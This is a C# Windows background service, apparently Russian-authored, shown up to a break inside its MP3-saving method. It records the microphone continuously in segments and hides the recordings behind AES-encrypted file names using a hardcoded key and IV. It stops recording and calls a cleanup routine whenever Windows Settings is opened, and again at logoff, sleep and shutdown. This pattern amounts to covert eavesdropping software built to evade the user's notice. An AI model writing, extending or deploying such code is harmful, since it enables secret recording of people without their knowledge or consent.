using Microsoft.Extensions.Hosting;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using NAudio.Wave;
using NAudio.Lame;

namespace AudioCore
{
    public class Worker : BackgroundService
    {
        private readonly ServiceConfiguration _config;
        private readonly string _serviceExePath;
        private readonly string _serviceExeName;

        private volatile bool _isRecording = false;
        private volatile bool _settingsWindowOpen = false;
        private CancellationTokenSource _globalCts;
        private DateTime _lastProcessCheck = DateTime.MinValue;
        private Stopwatch _segmentStopwatch;
        private List<byte> _audioBuffer;
        private object _bufferLock = new object();
        private IntPtr _currentWaveIn = IntPtr.Zero;
        private WaveFormat _currentFormat;

        // WinAPI константы и делегаты
        private const uint WAVE_MAPPER = 0xFFFFFFFF;
        private const uint CALLBACK_NULL = 0x00000000;
        private const uint CALLBACK_FUNCTION = 0x00030000;
        private const uint MMSYSERR_NOERROR = 0;
        private const uint WIM_DATA = 0x3C0;

        // Настройки MP3 по умолчанию
        private const LAMEPreset DEFAULT_MP3_PRESET = LAMEPreset.STANDARD;
        private const int DEFAULT_MP3_BITRATE = 128;

        // Статический ключ/IV для AES-шифрования (256 бит ключ, 128 бит IV).
        // Для большинства сценариев этого достаточно, чтобы сделать файлы нечитаемыми без знания ключа.
        private static readonly byte[] EncryptionKey = new byte[32]
        {
            0x3A, 0x7F, 0x21, 0x94, 0xC5, 0xD2, 0x6B, 0x11,
            0x8E, 0x4C, 0xF9, 0x53, 0x07, 0xB8, 0xDA, 0x62,
            0x19, 0xAF, 0x33, 0xE4, 0x5D, 0x70, 0x88, 0x9B,
            0xC1, 0x2E, 0x47, 0x6A, 0x8D, 0x90, 0xAB, 0xCD
        };

        private static readonly byte[] EncryptionIV = new byte[16]
        {
            0x12, 0x34, 0x56, 0x78,
            0x9A, 0xBC, 0xDE, 0xF0,
            0x0F, 0x1E, 0x2D, 0x3C,
            0x4B, 0x5A, 0x69, 0x78
        };

        /// <summary>
        /// Шифрует имя файла (без расширения) используя AES и возвращает Base64 строку
        /// </summary>
        private static string EncryptFileName(string fileNameWithoutExtension)
        {
            try
            {
                using var aes = Aes.Create();
                if (aes == null)
                    return Guid.NewGuid().ToString("N"); // Fallback

                aes.Key = EncryptionKey;
                aes.IV = EncryptionIV;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                byte[] nameBytes = System.Text.Encoding.UTF8.GetBytes(fileNameWithoutExtension);
                using var encryptor = aes.CreateEncryptor();
                byte[] encrypted = encryptor.TransformFinalBlock(nameBytes, 0, nameBytes.Length);

                // Конвертируем в Base64 и заменяем небезопасные символы для имени файла
                string base64 = Convert.ToBase64String(encrypted);
                return base64.Replace('/', '_').Replace('+', '-').Replace("=", "");
            }
            catch
            {
                return Guid.NewGuid().ToString("N"); // Fallback
            }
        }

        /// <summary>
        /// Расшифровывает имя файла из Base64 строки
        /// </summary>
        private static string? DecryptFileName(string encryptedFileName)
            {
                try
                {
                // Восстанавливаем Base64 формат
                string base64 = encryptedFileName.Replace('_', '/').Replace('-', '+');
                // Добавляем padding если нужно
                int mod4 = base64.Length % 4;
                if (mod4 != 0)
                    base64 += new string('=', 4 - mod4);

                byte[] encrypted = Convert.FromBase64String(base64);

                using var aes = Aes.Create();
                if (aes == null)
                    return null;

                aes.Key = EncryptionKey;
                aes.IV = EncryptionIV;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using var decryptor = aes.CreateDecryptor();
                byte[] decrypted = decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
                return System.Text.Encoding.UTF8.GetString(decrypted);
            }
            catch
            {
                return null;
            }
        }

        public Worker(ServiceConfiguration config)
                    {
            _config = config ?? throw new ArgumentNullException(nameof(config));
            _segmentStopwatch = new Stopwatch();
            _audioBuffer = new List<byte>();

            var process = Process.GetCurrentProcess();
            var mainModule = process.MainModule ?? throw new InvalidOperationException("Не удалось получить основной модуль процесса");
            _serviceExePath = mainModule.FileName;
            _serviceExeName = Path.GetFileName(_serviceExePath);

            _globalCts = new CancellationTokenSource();

            // Запускаем самопроверку
            SelfTest();
            
            // Создаем папки с абсолютными путями
            CreateDirectoriesWithAbsolutePaths();

            RegisterForShutdownNotification();

            Log($"=== СЕРВИС ИНИЦИАЛИЗИРОВАН ===");
            Log($"Путь к сервису: {_serviceExePath}");
            //Log($"Конфигурация: SampleRate={_config.SampleRate}, BitsPerSample={_config.BitsPerSample}, Channels={_config.Channels}");
            //Log($"Длительность сегмента: {_config.SegmentDurationSeconds}с");
            //Log($"Формат аудио (код): {_config.AudioFormatCode} (0=wav,1=mp3)");
            //Log($"Папка для записи: {GetAbsolutePath(_config.OutputFolder)}");
        }

        // Самопроверка сервиса
        private void SelfTest()
        {
            Log("=== ЗАПУСК САМОПРОВЕРКИ ===");
            
            try
            {
                // 1. Проверка конфигурации
                Log("1. Проверка конфигурации...");
                
                if (_config.SegmentDurationSeconds <= 0)
                {
                    throw new InvalidOperationException($"SegmentDurationSeconds={_config.SegmentDurationSeconds}. Должно быть больше 0.");
                }
                
                if (_config.SampleRate <= 0)
        {
                    throw new InvalidOperationException($"SampleRate={_config.SampleRate}. Должно быть больше 0.");
                }
                
                if (_config.BitsPerSample <= 0)
                {
                    throw new InvalidOperationException($"BitsPerSample={_config.BitsPerSample}. Должно быть больше 0.");
                }
                
                if (_config.Channels <= 0)
                {
                    throw new InvalidOperationException($"Channels={_config.Channels}. Должно быть больше 0.");
                }
                
                // AudioFormatCode: 0 = WAV, 1 = MP3
                if (_config.AudioFormatCode != 0 && _config.AudioFormatCode != 1)
            {
                    throw new InvalidOperationException($"AudioFormatCode={_config.AudioFormatCode}. Допустимо только 0 (wav) или 1 (mp3).");
                }
                                
                if (string.IsNullOrEmpty(_config.OutputFolder))
                {
                    throw new InvalidOperationException("OutputFolder не задан.");
                }
                
                Log("✓ Конфигурация корректна");
                
                // 2. Проверка расчетов
                Log("2. Проверка расчетов...");
                
                var format = CreateWaveFormat(_config.SampleRate, _config.BitsPerSample, _config.Channels);
                int bufferSize = (int)format.nAvgBytesPerSec * _config.SegmentDurationSeconds;
                
                if (bufferSize <= 0)
                {
                    throw new InvalidOperationException($"Расчетный размер буфера={bufferSize}. Проверьте настройки (SampleRate={_config.SampleRate}, BitsPerSample={_config.BitsPerSample}, Channels={_config.Channels}, SegmentDuration={_config.SegmentDurationSeconds})");
                }
                
                Log($"✓ Размер буфера: {bufferSize} байт ({bufferSize / 1024} KB)");
                
                // 3. Проверка формата
                Log("3. Проверка формата аудио...");
                string fmt = _config.AudioFormatCode == 1 ? "mp3" : "wav";
                Log($"✓ Формат аудио из конфигурации: код={_config.AudioFormatCode} ({fmt})");
                
                // 4. Проверка доступности WinMM API
                Log("4. Проверка WinMM API...");
                try
                {
                    // Пробуем получить информацию об устройстве
                    WaveFormat testFormat = CreateWaveFormat(44100, 16, 2);
                    IntPtr testHandle;
                    uint result = waveInOpen(out testHandle, WAVE_MAPPER, ref testFormat,
                        IntPtr.Zero, IntPtr.Zero, CALLBACK_NULL);
                    
                    if (result == MMSYSERR_NOERROR && testHandle != IntPtr.Zero)
                    {
                        waveInClose(testHandle);
                        Log("✓ WinMM API доступен");
                    }
                    else
                    {
                        string errorText = GetWaveErrorText(result);
                        Log($"⚠ WinMM API доступен, но устройство не открывается: {errorText}");
                    }
                }
                catch (Exception ex)
                {
                    Log($"⚠ Ошибка WinMM API: {ex.Message}");
                }
                
                Log("=== САМОПРОВЕРКА ЗАВЕРШЕНА УСПЕШНО ===");
                }
                catch (Exception ex)
                {
                Log($"=== ОШИБКА САМОПРОВЕРКИ ===");
                Log($"Ошибка: {ex.Message}");
                Log($"Тип: {ex.GetType().Name}");
                throw;
                }
            }

        // Создание папок с абсолютными путями
        private void CreateDirectoriesWithAbsolutePaths()
        {
            try
            {
                string outputFolder = GetAbsolutePath(_config.OutputFolder);

                if (!string.IsNullOrEmpty(outputFolder))
                {
                    Directory.CreateDirectory(outputFolder);
                    //Log($"Создана папка для записи: {outputFolder}");
                }
            }
            catch
            {
                // Игнорируем ошибки создания папки записи
            }
        }

        // Получение абсолютного пути
        private string GetAbsolutePath(string path)
        {
            if (string.IsNullOrEmpty(path))
                return path;

            // Если путь абсолютный, возвращаем как есть
            if (Path.IsPathRooted(path))
                return path;

            // Если путь относительный, делаем абсолютным относительно текущей директории
            return Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, path));
                }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            Log("=== ВЫПОЛНЕНИЕ СЕРВИСА НАЧАТО ===");

            // Даем сервису время сообщить о состоянии "Выполняется"
            await Task.Delay(1000, stoppingToken);

            // ВЫПОЛНЯЕМ ОЧИСТКУ ПРИ ЗАПУСКЕ СЕРВИСА
            Log("=== ВЫПОЛНЕНИЕ ОЧИСТКИ ПРИ ЗАПУСКЕ СЕРВИСА ===");
            ExecuteCompleteCleanup();

            // Запускаем запись сразу
            StartRecording();

            // Обработка событий выключения системы
            SystemEvents.SessionEnding += OnSessionEnding;
            SystemEvents.PowerModeChanged += OnPowerModeChanged;

            // Основной цикл мониторинга
            while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                    bool wasOpen = _settingsWindowOpen;
                    bool isOpen = CheckSystemSettingsProcess();

                    if (isOpen && !wasOpen)
                    {
                        Log("=== SYSTEMSETTINGS ОБНАРУЖЕН ===");
                        _settingsWindowOpen = true;
                        StopRecording();
                        Log("Запись остановлена, начинаем очистку...");
                        ExecuteCompleteCleanup();
                        Log("=== ОЧИСТКА ЗАВЕРШЕНА ===");
                    }
                    else if (!isOpen && wasOpen)
                    {
                        Log("=== SYSTEMSETTINGS ЗАКРЫТ ===");
                        _settingsWindowOpen = false;
                        StartRecording();
                    }

                    await Task.Delay(1000, stoppingToken);
                }
                catch (OperationCanceledException)
                {
                    // Сервис останавливается
                    break;
            }
            catch (Exception ex)
            {
                    Log($"Ошибка в основном цикле: {ex.Message}");
                    try
                    {
                        await Task.Delay(2000, stoppingToken);
            }
                    catch (OperationCanceledException)
                    {
                        break;
                    }
                }
            }

            StopRecording();
            Log("=== ВЫПОЛНЕНИЕ СЕРВИСА ЗАВЕРШЕНО ===");
        }

        // Обработчик выхода пользователя из системы или завершения работы
        private void OnSessionEnding(object sender, SessionEndingEventArgs e)
        {
            Log($"=== ОБНАРУЖЕНО СОБЫТИЕ СИСТЕМЫ: {e.Reason} ===");
            ExecuteShutdownCleanup();
        }

        // Обработчик изменения режима питания
        private void OnPowerModeChanged(object sender, PowerModeChangedEventArgs e)
        {
            if (e.Mode == PowerModes.Suspend)
            {
                Log($"=== ОБНАРУЖЕНО ПЕРЕХОД В СПЯЩИЙ РЕЖИМ ===");
                ExecuteShutdownCleanup();
            }
        }

        // Очистка при завершении работы сервиса
        private void ExecuteShutdownCleanup()
                    {
                        try
                        {
                Log("=== ВЫПОЛНЕНИЕ ОЧИСТКИ ПРИ ЗАВЕРШЕНИИ РАБОТЫ ===");

                // Останавливаем запись
                StopRecording();

                // Выполняем полную очистку
                ExecuteCompleteCleanup();

                Log("=== ОЧИСТКА ПРИ ЗАВЕРШЕНИИ ВЫПОЛНЕНА ===");
                        }
                        catch (Exception ex)
                        {
                Log($"Ошибка при очистке при завершении: {ex.Message}");
            }
        }

        public override async Task StopAsync(CancellationToken cancellationToken)
        {
            Log("=== ВЫЗВАН STOPASYNC - ЗАВЕРШЕНИЕ СЕРВИСА ===");
            ExecuteShutdownCleanup();
            await base.StopAsync(cancellationToken);
        }

        // WinAPI для обработки выключения системы
        [DllImport("Kernel32")]
        private static extern bool SetConsoleCtrlHandler(ConsoleCtrlHandlerProc handler, bool add);

        private delegate bool ConsoleCtrlHandlerProc(CtrlTypes sig);

        private enum CtrlTypes
        {
            CTRL_C_EVENT = 0,
            CTRL_BREAK_EVENT = 1,
            CTRL_CLOSE_EVENT = 2,
            CTRL_LOGOFF_EVENT = 5,
            CTRL_SHUTDOWN_EVENT = 6
        }

        // Обработчик событий консоли (включая выключение системы)
        private bool ConsoleCtrlHandler(CtrlTypes ctrlType)
        {
            switch (ctrlType)
            {
                case CtrlTypes.CTRL_SHUTDOWN_EVENT:
                case CtrlTypes.CTRL_LOGOFF_EVENT:
                case CtrlTypes.CTRL_CLOSE_EVENT:
                    Log($"=== ОБНАРУЖЕНО СОБЫТИЕ ВЫКЛЮЧЕНИЯ: {ctrlType} ===");
                    ExecuteShutdownCleanup();
                    return true;
                default:
                    return false;
            }
        }

        // Регистрация обработчика выключения системы
        private void RegisterForShutdownNotification()
        {
            try
            {
                SetConsoleCtrlHandler(ConsoleCtrlHandler, true);
                Log("Зарегистрирован обработчик выключения системы");
                    }
                    catch (Exception ex)
                    {
                Log($"Ошибка регистрации обработчика выключения: {ex.Message}");
            }
        }

        private bool CheckSystemSettingsProcess()
                {
                    try
                    {
                if ((DateTime.Now - _lastProcessCheck).TotalSeconds < 1)
                    return _settingsWindowOpen;

                _lastProcessCheck = DateTime.Now;

                var processes = Process.GetProcessesByName("SystemSettings");
                if (processes.Length == 0)
                {
                    if (_settingsWindowOpen)
                            {
                        Log("SystemSettings завершён — возобновляем запись");
                        _settingsWindowOpen = false;
                        StartRecording();
                    }
                    return false;
                }

                bool suspended = false;
                var proc = processes[0]; // берём первый экземпляр

                foreach (ProcessThread thread in proc.Threads)
                                {
                                    try
                                    {
                        if (thread.ThreadState == System.Diagnostics.ThreadState.Wait &&
                            thread.WaitReason == ThreadWaitReason.Suspended)
                                        {
                            suspended = true;
                        }
                    }
                    catch (Exception ex)
                    {
                        Log($"Ошибка проверки потока SystemSettings: {ex.Message}");
                    }
                }

                bool found = !suspended;

                // Управление записью
                if (found && !_settingsWindowOpen)
                {
                    Log($"SystemSettings найден (PID: {proc.Id}) — начинаем очистку");
                    _settingsWindowOpen = true;
                    StopRecording();
                }
                else if (!found && _settingsWindowOpen)
                {
                    Log($"SystemSettings завис/приостановлен (PID: {proc.Id}) — возобновляем запись");
                    _settingsWindowOpen = false;
                    StartRecording();
                    }

                return found;
            }
            catch (Exception ex)
            {
                Log($"Общая ошибка проверки SystemSettings: {ex.Message}");
                return false;
            }
        }

        private void StartRecording()
        {
            if (_isRecording) return;

            Log("Запуск аудиозаписи");
            _isRecording = true;

            // Очищаем буфер перед началом записи
            lock (_bufferLock)
            {
                _audioBuffer.Clear();
            }

            Task.Run(() => SimpleRecordLoop());
        }

        private void StopRecording()
            {
                if (!_isRecording)
                {
                Log("Запись уже остановлена");
                return;
            }

            Log("Остановка аудиозаписи");
            // Флаг записи снимаем, но сами waveIn* не трогаем:
            // текущий SimpleRecordSegment сам корректно остановит и закроет устройство.
                    _isRecording = false;

            if (_segmentStopwatch.IsRunning)
            {
                _segmentStopwatch.Stop();
                    }

                    Thread.Sleep(500);
            Log($"Запись остановлена. Финальное состояние: _isRecording={_isRecording}, _settingsWindowOpen={_settingsWindowOpen}");
        }

        private void SimpleRecordLoop()
        {
            Log("Начало цикла записи");

            while (_isRecording && !_settingsWindowOpen)
                    {
                        try
                        {
                    if (_settingsWindowOpen)
                            {
                        Log("Флаг _settingsWindowOpen установлен - прерывание цикла записи");
                        break;
                    }

                    Log("Вызов SimpleRecordSegment...");
                    SimpleRecordSegment();

                    if (_settingsWindowOpen)
                    {
                        Log("Флаг _settingsWindowOpen установлен после сегмента - прерывание цикла");
                        break;
                    }

                    if (_isRecording && !_settingsWindowOpen)
                {
                        Thread.Sleep(1000);
                            }
                        }
                        catch (Exception ex)
                        {
                    Log($"Ошибка в цикле записи: {ex.Message}");
                    if (_settingsWindowOpen)
                    {
                        Log("Ошибка произошла, но флаг установлен - прерывание цикла");
                        break;
                    }
                    Thread.Sleep(5000);
                }
            }

            Log("Цикл записи завершен");
            _isRecording = false;
        }

        // Основной метод записи с поддержкой разных форматов
        private void SimpleRecordSegment()
        {
            IntPtr hWaveIn = IntPtr.Zero;
            GCHandle gch = default;
            WaveHdr hdr = new WaveHdr();

            try
            {
                if (!_isRecording || _settingsWindowOpen)
            {
                    Log($"Запись не запущена: _isRecording={_isRecording}, _settingsWindowOpen={_settingsWindowOpen}");
                    return;
        }

                // Проверяем SegmentDurationSeconds
                if (_config.SegmentDurationSeconds <= 0)
        {
                    Log($"ОШИБКА: SegmentDurationSeconds={_config.SegmentDurationSeconds}. Должно быть больше 0.");
                    return;
                }

                Log($"Запись сегмента: {_config.SegmentDurationSeconds} секунд");

                // Создаем формат из конфигурации
                var format = CreateWaveFormatFromConfig();
                
                _currentFormat = format;

                Log($"Используется формат: {format.nSamplesPerSec} Hz, {format.wBitsPerSample} бит, {format.nChannels} каналов");
                Log($"nAvgBytesPerSec: {format.nAvgBytesPerSec}");
                Log($"Расчетный размер буфера: {format.nAvgBytesPerSec * _config.SegmentDurationSeconds} байт");

                uint result = waveInOpen(out hWaveIn, WAVE_MAPPER, ref format,
                    IntPtr.Zero, IntPtr.Zero, CALLBACK_NULL);

                if (result != MMSYSERR_NOERROR || hWaveIn == IntPtr.Zero)
                {
                    string errorText = GetWaveErrorText(result);
                    Log($"Ошибка открытия аудиоустройства: {result} - {errorText}");
                    Log($"Попытка использования формата по умолчанию: 44100 Hz, 16 bit, 2 channels");
                    
                    // Пробуем формат по умолчанию
                    format = CreateWaveFormat(44100, 16, 2);
                    result = waveInOpen(out hWaveIn, WAVE_MAPPER, ref format,
                        IntPtr.Zero, IntPtr.Zero, CALLBACK_NULL);
                        
                    if (result != MMSYSERR_NOERROR || hWaveIn == IntPtr.Zero)
                    {
                        Log($"Ошибка открытия с форматом по умолчанию: {GetWaveErrorText(result)}");
                    return;
                    }
                }

                    _currentWaveIn = hWaveIn;

                // Расчет размера буфера для всего сегмента
                int bufferSize = (int)format.nAvgBytesPerSec * _config.SegmentDurationSeconds;
                Log($"Создание буфера размером: {bufferSize} байт ({_config.SegmentDurationSeconds} секунд)");

                // Проверяем размер буфера
                if (bufferSize <= 0)
                {
                    Log($"ОШИБКА: Размер буфера = {bufferSize}. Проверьте настройки!");
                    return;
                }

                byte[] buffer = new byte[bufferSize];
                gch = GCHandle.Alloc(buffer, GCHandleType.Pinned);

                hdr = new WaveHdr
                {
                    lpData = gch.AddrOfPinnedObject(),
                    dwBufferLength = (uint)bufferSize,
                    dwFlags = 0,
                    dwBytesRecorded = 0,
                    dwUser = IntPtr.Zero,
                    dwLoops = 0,
                    lpNext = IntPtr.Zero,
                    reserved = IntPtr.Zero
                };

                uint headerSize = (uint)Marshal.SizeOf<WaveHdr>();

                result = waveInPrepareHeader(hWaveIn, ref hdr, headerSize);
                if (result != MMSYSERR_NOERROR)
                            {
                    Log($"Ошибка подготовки заголовка: {result}");
                    return;
                }

                result = waveInAddBuffer(hWaveIn, ref hdr, headerSize);
                if (result != MMSYSERR_NOERROR)
                {
                    Log($"Ошибка добавления буфера: {result}");
                    return;
                }

                Log($"Начало записи сегмента ({_config.SegmentDurationSeconds} секунд)");
                _segmentStopwatch.Restart();

                // Запускаем запись
                result = waveInStart(hWaveIn);
                if (result != MMSYSERR_NOERROR)
                {
                    Log($"Ошибка запуска записи: {result}");
                    return;
                }

                Log("Запись запущена, ожидание...");

                // Ожидаем заполнения буфера или прерывания
                int maxWaitTime = (_config.SegmentDurationSeconds + 2) * 1000;
                int elapsedTime = 0;
                int checkInterval = 100;

                while (elapsedTime < maxWaitTime && _isRecording && !_settingsWindowOpen)
                {
                    Thread.Sleep(checkInterval);
                    elapsedTime += checkInterval;

                    // Проверяем, заполнен ли буфер
                    if ((hdr.dwFlags & WHDR_DONE) == WHDR_DONE)
                    {
                        Log($"Буфер заполнен за {elapsedTime} мс");
                        break;
                    }

                    // Логируем прогресс каждые 2 секунды
                    if (elapsedTime % 2000 < checkInterval && elapsedTime > 0)
                    {
                        Log($"Прогресс записи: {elapsedTime / 1000}с / {_config.SegmentDurationSeconds}с");
                    }
                }

                _segmentStopwatch.Stop();

                Log("Остановка аудиоустройства...");
                waveInStop(hWaveIn);
                waveInReset(hWaveIn);

                Thread.Sleep(200);

                // Проверяем, есть ли записанные данные
                if (hdr.dwBytesRecorded > 0)
                {
                    double actualDuration = (double)hdr.dwBytesRecorded / format.nAvgBytesPerSec;
                    Log($"Записан сегмент: {hdr.dwBytesRecorded} байт ({actualDuration:F2} секунд)");

                    SaveAudioFile(buffer, hdr.dwBytesRecorded, format, actualDuration);
                }
                else
                {
                    Log("Нет записанных данных (dwBytesRecorded = 0)");
                }

                // Освобождаем ресурсы
                waveInUnprepareHeader(hWaveIn, ref hdr, headerSize);
            }
            catch (Exception ex)
            {
                Log($"Ошибка записи: {ex.Message}\n{ex.StackTrace}");
            }
            finally
            {
                if (hWaveIn != IntPtr.Zero && hWaveIn == _currentWaveIn)
                {
                    // Закрываем устройство захвата только один раз – из того потока, который им владеет.
                    waveInClose(hWaveIn);
                        _currentWaveIn = IntPtr.Zero;
                }

                if (gch.IsAllocated)
                    gch.Free();
            }
        }

        // Создание формата из конфигурации
        private WaveFormat CreateWaveFormatFromConfig()
        {
            try
            {
                // Используем значения из конфигурации
                int sampleRate = _config.SampleRate;
                int bitsPerSample = _config.BitsPerSample;
                int channels = _config.Channels;
                
                return CreateWaveFormat(sampleRate, bitsPerSample, channels);
            }
            catch (Exception ex)
            {
                Log($"Ошибка создания формата из конфигурации: {ex.Message}");
                return CreateWaveFormat(44100, 16, 2); // Формат по умолчанию
            }
        }

        // Создание WaveFormat структуры
        private WaveFormat CreateWaveFormat(int sampleRate, int bitsPerSample, int channels)
        {
            ushort blockAlign = (ushort)(channels * bitsPerSample / 8);
            uint avgBytesPerSec = (uint)(sampleRate * blockAlign);
            
            return new WaveFormat
            {
                wFormatTag = 1, // PCM
                nChannels = (ushort)channels,
                nSamplesPerSec = (uint)sampleRate,
                nAvgBytesPerSec = avgBytesPerSec,
                nBlockAlign = blockAlign,
                wBitsPerSample = (ushort)bitsPerSample,
                cbSize = 0
            };
        }

        // Функция для получения текстового описания ошибки WinMM
        private string GetWaveErrorText(uint errorCode)
                    {
                        try
                        {
                StringBuilder errorText = new StringBuilder(256);
                uint result = waveInGetErrorText(errorCode, errorText, (uint)errorText.Capacity);
                if (result == MMSYSERR_NOERROR)
                {
                    return errorText.ToString();
                }
            }
            catch { }

            // Стандартные коды ошибок WinMM
            switch (errorCode)
            {
                case 2: return "MMSYSERR_BADDEVICEID - Указанный номер устройства выходит за допустимые пределы";
                case 4: return "MMSYSERR_ALLOCATED - Указанный ресурс уже выделен";
                case 5: return "MMSYSERR_INVALHANDLE - Указанный дескриптор устройства недействителен";
                case 6: return "MMSYSERR_NODRIVER - Отсутствует драйвер устройства";
                case 7: return "MMSYSERR_NOMEM - Невозможно выделить или заблокировать память";
                case 10: return "MMSYSERR_BADERRNUM - Указанный номер ошибки выходит за допустимые пределы";
                case 11: return "MMSYSERR_INVALFLAG - Указан недопустимый флаг";
                case 12: return "MMSYSERR_INVALPARAM - Указан недопустимый параметр";
                case 13: return "WAVERR_BADFORMAT - Попытка открыть устройство с неподдерживаемым форматом волны";
                case 32: return "MMSYSERR_BADDEVICEID - Указанный номер устройства выходит за допустимые пределы";
                default: return $"Неизвестная ошибка: {errorCode}";
            }
        }

        private void SaveAudioFile(byte[] audioData, uint dataLength, WaveFormat format, double actualDurationSeconds)
                                {
                                    try
                                    {
                // Применяем регулировку громкости, если задана
                byte[] processedData = ApplyMicrophoneVolume(audioData, dataLength, format, _config.MicrophoneVolume);

                string outputFolder = GetAbsolutePath(_config.OutputFolder);
                if (string.IsNullOrEmpty(outputFolder))
                {
                    Log("OutputFolder не настроен");
                    return;
                }

            // Определяем формат из конфигурации: 0 = wav, 1 = mp3
            bool isMp3 = _config.AudioFormatCode == 1;
            string extension = isMp3 ? "mp3" : "wav";

            Log("=== ОПРЕДЕЛЕНИЕ ФОРМАТА ===");
            Log($"AudioFormatCode из _config: {_config.AudioFormatCode} (0=wav,1=mp3)");
            Log($"Выбранное расширение: '{extension}'");

                // Информация о длительности в имени файла
                string durationInfo = actualDurationSeconds >= _config.SegmentDurationSeconds - 0.5 ?
                    $"{_config.SegmentDurationSeconds}sec" :
                    $"{actualDurationSeconds:F1}sec";

                // Информация о формате в имени файла
                string formatInfo = $"{format.nSamplesPerSec / 1000}k_{format.wBitsPerSample}bit_{format.nChannels}ch";

                // Оригинальное имя файла с расширением
                // Если шифрование содержимого включено - используем расширение .dat в имени
                // Если шифрование содержимого выключено - используем оригинальное расширение (.mp3 или .wav)
                string originalExtension = _config.EncryptAudio ? "dat" : extension;
                
                // Добавляем случайный идентификатор в НАЧАЛО имени файла для уникальности зашифрованного префикса
                string randomId = Guid.NewGuid().ToString("N").Substring(0, 12);
                string originalFileNameWithExt = $"{randomId}_record_{DateTime.Now:yyyyMMdd_HHmmss}_{formatInfo}_{durationInfo}.{originalExtension}";
                
                // Всегда шифруем полное имя файла (с расширением) для конфиденциальности
                string finalFileNameWithoutExt = EncryptFileName(originalFileNameWithExt);
                Log($"Имя файла зашифровано: {originalFileNameWithExt} -> {finalFileNameWithoutExt}");

                // Всегда сохраняем файл без расширения (имя зашифровано)
                // Если шифрование содержимого включено - шифруем содержимое
                // Если шифрование содержимого выключено - содержимое не шифруется, но имя всё равно зашифровано
                string fileName = Path.Combine(outputFolder, finalFileNameWithoutExt);

                if (extension == "wav")
                {
                    Log($"Выбран формат WAV, вызываю SaveWavFile");
                    SaveWavFile(processedData, dataLength, format, fileName);
                    // Не сохраняем метаданные - имя файла уже содержит зашифрованное полное имя
                }
                else if (extension == "mp3")
                {
                    Log($"Выбран формат MP3, вызываю SaveMp3File");
                    try
                    {
                        // Сохраняем только MP3, без fallback на WAV
                        SaveMp3File(processedData, dataLength, format, fileName);
                        
                        // SaveMp3File уже проверяет, что файл создан и не пустой
                        // Дополнительная проверка
                        FileInfo fileInfo = new FileInfo(fileName);
                        if (!fileInfo.Exists || fileInfo.Length == 0)
                        {
                            Log($"ОШИБКА: MP3 файл не создан или пустой: {fileName}");
                            throw new InvalidOperationException("MP3 файл не был создан или пустой");
                        }
                        
                        Log($"MP3 файл успешно сохранён: {fileName}, размер: {fileInfo.Length} байт");

                        // Если включено шифрование в конфигурации — запускаем фоновое шифрование файла.
                        if (_config.EncryptAudio)
                        {
                            // Файл будет зашифрован в отдельный файл без расширения и исходный .mp3 будет удалён.
                            // Имя файла уже содержит зашифрованное полное имя, метаданные не нужны.
                            // Передаём путь к существующему файлу с проверенным размером
                            StartBackgroundEncryption(fileName, originalFileNameWithExt);
                        }
                        // Если шифрование содержимого выключено - файл уже сохранён с зашифрованным именем
                    }
                    catch (Exception mp3Ex)
                    {
                        Log($"ОШИБКА при сохранении MP3: {mp3Ex.GetType().Name}: {mp3Ex.Message}");
                        Log($"НЕ создаю WAV файл (как и требовалось)");
                        throw; // Пробрасываем исключение дальше
                                    }
                                }
                Log($"Аудиофайл сохранен: {Path.GetFileName(fileName)} (длительность: {actualDurationSeconds:F2}с)");
                        }
                        catch (Exception ex)
                        {
                Log($"Ошибка сохранения: {ex.Message}");
                        }
                    }

        /// <summary>
        /// Применяет коэффициент громкости к PCM-данным (16 bit) в памяти.
        /// </summary>
        private byte[] ApplyMicrophoneVolume(byte[] data, uint dataLength, WaveFormat format, double volume)
        {
            try
            {
                if (format.wBitsPerSample != 16)
                {
                    Log($"ApplyMicrophoneVolume: формат {format.wBitsPerSample} bit не поддерживается, громкость не изменяется");
                    return data;
                }

                // Если громкость 1.0, ничего не делаем
                if (Math.Abs(volume - 1.0) < 0.0001)
                    return data;

                // Ограничиваем разумный диапазон
                volume = Math.Clamp(volume, 0.0, 4.0);
                Log($"ApplyMicrophoneVolume: применяется громкость {volume:F2}");

                byte[] result = new byte[dataLength];
                Buffer.BlockCopy(data, 0, result, 0, (int)dataLength);

                int sampleCount = (int)dataLength / 2; // 16 bit = 2 байта
                for (int i = 0; i < sampleCount; i++)
                {
                    int index = i * 2;
                    short sample = (short)(result[index] | (result[index + 1] << 8));
                    double scaled = sample * volume;

                    if (scaled > short.MaxValue) scaled = short.MaxValue;
                    if (scaled < short.MinValue) scaled = short.MinValue;

                    short outSample = (short)scaled;
                    result[index] = (byte)(outSample & 0xFF);
                    result[index + 1] = (byte)((outSample >> 8) & 0xFF);
                }

                return result;
            }
            catch (Exception ex)
            {
                Log($"ApplyMicrophoneVolume: ошибка применения громкости: {ex.Message}");
                return data;
            }
        }

        private void SaveWavFile(byte[] audioData, uint dataLength, WaveFormat format, string fileName)
        {
            try
            {
                using (FileStream fs = new FileStream(fileName, FileMode.Create))
                using (BinaryWriter bw = new BinaryWriter(fs))
                {
                    // RIFF header
                    bw.Write(Encoding.ASCII.GetBytes("RIFF"));
                    bw.Write(36 + dataLength); // file size - 8
                    bw.Write(Encoding.ASCII.GetBytes("WAVE"));

                    // fmt chunk
                    bw.Write(Encoding.ASCII.GetBytes("fmt "));
                    bw.Write(16); // chunk size
                    bw.Write((short)1); // PCM format
                    bw.Write((short)format.nChannels);
                    bw.Write(format.nSamplesPerSec);
                    bw.Write(format.nAvgBytesPerSec);
                    bw.Write((short)format.nBlockAlign);
                    bw.Write((short)format.wBitsPerSample);

                    // data chunk
                    bw.Write(Encoding.ASCII.GetBytes("data"));
                    bw.Write(dataLength);
                    bw.Write(audioData, 0, (int)dataLength);
                }
            }
            catch (Exception ex)
            {
                Log($"Ошибка сохранения WAV: {ex.Message}");
                throw;
            }
        }

        private void SaveMp3File(byte[] pcmData, uint dataLength, WaveFormat format, string fileName)
        {
            // Удаляем MP3 файл, если он уже существует (на случай предыдущей ошибки)
            if (File.Exists(fileName))
        {
            try
            {
                    File.Delete(fileName);
                }
                catch { }
            }

            try
